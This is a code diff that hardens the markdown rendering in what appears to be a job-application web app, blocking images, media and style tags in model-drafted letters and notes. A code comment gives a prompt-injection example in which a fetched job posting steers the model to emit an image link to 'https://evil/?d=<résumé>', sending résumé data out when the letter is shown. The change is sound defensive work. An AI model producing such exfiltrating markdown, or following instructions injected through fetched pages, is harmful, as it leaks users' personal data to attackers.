@@ -227,6 +227,17 @@ const escapeHtml = (s) =>
   String(s ?? "").replace(/[&<>"']/g, (c) =>
     ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
 
+// Markdown that may carry untrusted text — model output steered by a fetched posting, or
+// notes the poller copied from one — rendered with nothing that fetches on its own. A
+// prompt-injected ![](https://evil/?d=<résumé>) would otherwise leak data the moment the
+// letter is shown, no click and no script needed (#342). Links stay: they need a click.
+const UNTRUSTED_MD_PURIFY = {
+  FORBID_TAGS: ["img", "image", "picture", "source", "video", "audio", "track", "svg", "math", "style", "link"],
+  FORBID_ATTR: ["style", "src", "srcset", "poster", "background"],
+};
+const renderUntrustedMarkdown = (md, opts) =>
+  DOMPurify.sanitize(marked.parse(md, opts), UNTRUSTED_MD_PURIFY);
+
 function toast(msg) {
   toastEl.textContent = msg;
   toastEl.setAttribute("aria-hidden", "false");
@@ -1027,7 +1038,7 @@ function renderView(data) {
           <span class="section-kicker">Workspace</span>
           <h3 id="notes-heading">Notes &amp; research</h3>
         </div>
-        <div class="prose-omi">${DOMPurify.sanitize(marked.parse(f.notes || "_No notes yet._", { gfm: true, breaks: false }))}</div>
+        <div class="prose-omi">${renderUntrustedMarkdown(f.notes || "_No notes yet._", { gfm: true, breaks: false })}</div>
       </section>
       ${materialSection(data)}
       <div class="status-actions section-divider">
@@ -1513,7 +1524,7 @@ function materialSection(data) {
         </div>
       </section>`;
   }
-  const html = DOMPurify.sanitize(marked.parse(data.material, { gfm: true, breaks: true }));
+  const html = renderUntrustedMarkdown(data.material, { gfm: true, breaks: true });
   // Regenerate is a drafting affordance — hide it when the engine is off (the server
   // refuses the draft anyway). Copy / Download / Discard act on the stored letter, so
   // they stay available.
